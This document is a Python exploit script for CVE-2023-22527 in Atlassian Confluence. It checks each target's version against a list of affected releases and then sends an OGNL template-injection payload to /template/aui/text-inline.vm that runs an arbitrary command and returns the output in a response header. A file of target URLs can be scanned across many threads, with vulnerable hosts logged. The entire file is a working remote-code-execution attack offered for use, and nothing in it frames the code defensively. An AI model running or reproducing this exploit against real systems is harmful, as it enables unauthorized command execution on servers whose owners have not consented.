import argparse,urllib3,requests,concurrent.futures,urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def process_target(target):
    parsed_url = urllib.parse.urlparse(target)
    if parsed_url.scheme not in ['http', 'https']:
        return "http://" + target
    return target
    
def get_confluence_version(target):
    parsed_url = urlparse(target)
    url = f"http://{parsed_url.netloc}/"
    try:
        response = requests.get(url, timeout=5, verify=False)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        version_span = soup.find('span', {'id': 'footer-build-information'})
        if version_span:
            confluence_version = version_span.text.strip()
            return confluence_version
    except requests.exceptions.RequestException as e:
        pass
    return None

def check_exploitable_version(version):
    exploitable_versions = ['8.0.', '8.1.', '8.2.', '8.3.', '8.4.', '8.5.0', '8.5.1', '8.5.2', '8.5.3']
    for exploitable_version in exploitable_versions:
        if version.startswith(exploitable_version):
            return True
    return False

def exploit(target, cmd):
    confluence_version = get_confluence_version(target)
    if confluence_version:
        if check_exploitable_version(confluence_version):
            url = f"{target}/template/aui/text-inline.vm"
            http_proxy = "http://127.0.0.1:8080"
            https_proxy = "http://127.0.0.1:8080"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'"+ cmd +"'}))"
            response = requests.post(url, headers=headers, data=data, timeout=5, verify=False)
            if (response.headers.get("X-Cmd-Response")):
                print(f"{target}\tVulnerable To Attack")
                with open('result.txt', 'a') as file:
                    file.write(f'{target}\n')

def main():
    parser = argparse.ArgumentParser(
    usage="python3 CVE-2023-22527.py -u <target> [-f <file>] -c <cmd>")
    parser.add_argument("-u", "--target", help="Target URL")
    parser.add_argument("-f", "--file", help="URL file")
    parser.add_argument("-c", "--cmd", default="whoami", help="Commands to execute")
    parser.add_argument("-t", "--thread", type=int, default=20, help="Number of threads")
    args = parser.parse_args()
    if args.file:
        with open(args.file, 'r') as file:
            targets = [process_target(line.strip()) for line in file]
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.thread) as executor:
                futures = {executor.submit(exploit, target, args.cmd) for target in targets}
            executor.shutdown(wait=True)
    else:
        target = process_target(args.target)
        exploit(target, args.cmd)
    print('Scanning Completed')
if __name__ == "__main__":
    main()
